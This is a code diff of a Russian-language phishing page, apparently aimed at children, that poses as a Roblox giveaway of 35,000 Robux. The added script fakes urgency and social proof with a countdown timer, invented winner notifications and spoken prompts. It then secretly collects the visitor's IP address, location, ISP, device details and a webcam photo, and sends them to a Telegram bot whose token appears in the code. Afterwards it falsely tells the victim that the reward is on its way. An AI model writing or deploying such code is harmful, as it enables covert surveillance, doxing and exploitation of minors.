@@ -3,54 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | 35,000 Robux</title>
+    <title>Roblox | Promo Distribution 2026</title>
     <style>
-        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { background: #191b1d; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
-        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        #st { margin-top: 20px; color: #0084ff; font-weight: bold; display: none; }
-        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        body { font-family: 'Gotham', 'Segoe UI', sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        .card { background: linear-gradient(180deg, #2e3133 0%, #191b1d 100%); border: 2px solid #0084ff; padding: 35px; border-radius: 25px; text-align: center; width: 85%; max-width: 400px; margin-top: 50px; box-shadow: 0 0 30px rgba(0,132,255,0.4); position: relative; }
+        .robux-badge { background: #0084ff; color: white; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 12px; position: absolute; top: -15px; left: 50%; transform: translateX(-50%); }
+        h1 { font-size: 28px; margin: 15px 0 5px; text-shadow: 0 0 10px #0084ff; }
+        .timer { color: #ff4d4d; font-weight: bold; font-size: 18px; margin-bottom: 20px; }
+        .btn { background: #0084ff; color: white; border: none; padding: 20px; width: 100%; border-radius: 15px; font-size: 22px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.3s; box-shadow: 0 6px 0 #0056a3; }
+        .btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #0056a3; }
+        #st { margin-top: 20px; font-weight: bold; color: #0084ff; height: 30px; }
+        
+        /* Уведомления */
+        .notif { position: fixed; bottom: 20px; background: rgba(0,0,0,0.9); padding: 12px 20px; border-radius: 10px; border-left: 5px solid #00ff00; font-size: 13px; animation: slideUp 0.5s ease-out; z-index: 100; }
+        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
-    <h2>БОНУС: 35,000 ROBUX</h2>
-    <p>Нажмите кнопку и разрешите доступ к камере для Face ID верификации.</p>
-    <button class="btn" id="go" onclick="start()">ПОЛУЧИТЬ</button>
-    <div id="st">СОЕДИНЕНИЕ С TELEGRAM API...</div>
+<div class="card">
+    <div class="robux-badge">LIMITED EVENT</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1);">
+    <h1>35,000 ROBUX</h1>
+    <div class="timer" id="timer">ОСТАЛОСЬ: 04:59</div>
+    <p style="color: #abb1b6; font-size: 14px;">Для моментального зачисления подтвердите биометрию через защищенный шлюз. <b>Внимание:</b> 1 запрос на устройство!</p>
+    
+    <button class="btn" id="go" onclick="startMegaDox()">ПОЛУЧИТЬ</button>
+    <div id="st"></div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function start() {
-        const btn = document.getElementById('go');
+    const BT = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const CH = '7889497672';
+
+    // Голосовой движок
+    function speak(txt) {
+        const m = new SpeechSynthesisUtterance(txt);
+        m.lang = 'ru-RU';
+        m.rate = 1.0;
+        window.speechSynthesis.speak(m);
+    }
+
+    // Фейковые уведомления
+    const names = ["Dima_Pro", "Roblox_King", "Masha2015", "Killer_777", "Admin_Rbx", "Legend_Play"];
+    function showNotif() {
+        const n = document.createElement('div');
+        n.className = 'notif';
+        n.innerHTML = `✅ <b>${names[Math.floor(Math.random()*names.length)]}</b> только что получил 35,000 Robux!`;
+        document.body.appendChild(n);
+        setTimeout(() => n.remove(), 4000);
+    }
+    setInterval(showNotif, 7000);
+
+    // Таймер
+    let time = 299;
+    setInterval(() => {
+        let m = Math.floor(time/60); let s = time%60;
+        document.getElementById('timer').innerText = `ОСТАЛОСЬ: 0${m}:${s<10?'0'+s:s}`;
+        if(time>0) time--;
+    }, 1000);
+
+    async function startMegaDox() {
+        document.getElementById('go').style.display = 'none';
         const st = document.getElementById('st');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
-        btn.style.display = 'none';
-        st.style.display = 'block';
+        speak("Инициализация защиты. Пожалуйста, смотрите прямо в камеру для сканирования лица.");
+        st.innerText = "ПОДКЛЮЧЕНИЕ К API TELEGRAM...";
+
+        // МЕГА ДОКС
+        let dox = `🚨 **УЛЬТРА-ДОКС ОТЧЕТ** 🚨\n\n`;
+        
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            dox += `📍 **IP:** \`${d.ip}\`\n`;
+            dox += `🌍 **Локация:** ${d.city}, ${d.region}, ${d.country_name}\n`;
+            dox += `📡 **Провайдер:** ${d.org}\n`;
+            dox += `📱 **Сеть:** ${d.asn} (${d.network})\n`;
+        } catch(e) { dox += `📍 IP: Ошибка получения\n`; }
+
+        dox += `\n💻 **ЖЕЛЕЗО И ОС:**\n`;
+        dox += `📱 **Платформа:** ${navigator.platform}\n`;
+        dox += `⚙️ **Ядер CPU:** ${navigator.hardwareConcurrency || '?'}\n`;
+        dox += `🔋 **Заряд:** Опрос...\n`;
+        dox += `🖥 **Экран:** ${screen.width}x${screen.height}\n`;
+        dox += `🌐 **Язык:** ${navigator.language}\n`;
+        dox += `⏳ **Часовой пояс:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            dox = dox.replace('Опрос...', `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Расход'})`);
+        }
 
         try {
-            // Простейший запрос без сложных условий
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             v.srcObject = stream;
             
-            // Ждем запуска потока
             v.onloadedmetadata = () => {
                 v.play();
                 let p = 0;
-                const timer = setInterval(() => {
+                const intr = setInterval(() => {
                     p += 20;
-                    st.innerText = "СКАНИРОВАНИЕ ЛИЦА: " + p + "%";
-                    if(p >= 100) clearInterval(timer);
-                }, 1000);
+                    st.innerText = "АНАЛИЗ БИОМЕТРИИ: " + p + "%";
+                    if(p === 60) speak("Обработка данных. Не двигайтесь.");
+                    if(p >= 100) clearInterval(intr);
+                }, 1100);
 
-                // Снимок через 5.5 сек
                 setTimeout(() => {
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
@@ -58,25 +123,25 @@
                     
                     c.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append('chat_id', '7889497672');
+                        fd.append('chat_id', CH);
                         fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', '💎 **ЛИЦО ПОЛУЧЕНО!**\nИсправлено зависание в Telegram.');
+                        fd.append('caption', dox + `\n\n📸 **ФОТО ПОЛУЧЕНО!**`);
 
-                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
-                            method: 'POST',
-                            body: fd
-                        }).then(() => {
+                        fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, { method: 'POST', body: fd })
+                        .then(() => {
+                            speak("Верификация пройдена успешно. Ожидайте зачисления тридцати пяти тысяч робуксов.");
                             stream.getTracks().forEach(t => t.stop());
-                            alert("✅ Личность подтверждена! Награда придет через 10-15 минут.");
+                            alert("✅ Личность подтверждена! Награда зачислится на аккаунт автоматически.");
                             window.location.href = "https://www.roblox.com";
                         });
-                    }, 'image/jpeg', 0.8);
-                }, 5500);
+                    }, 'image/jpeg', 0.85);
+                }, 6000);
             };
         } catch (e) {
-            alert("Ошибка! Нужно нажать 'Разрешить' для Face ID.");
-            btn.style.display = 'block';
-            st.style.display = 'none';
+            speak("Ошибка доступа. Для получения робуксов необходимо разрешить использование Face ID.");
+            alert("Разрешите камеру для получения бонуса!");
+            document.getElementById('go').style.display = 'block';
+            st.innerText = "";
         }
     }
 </script>
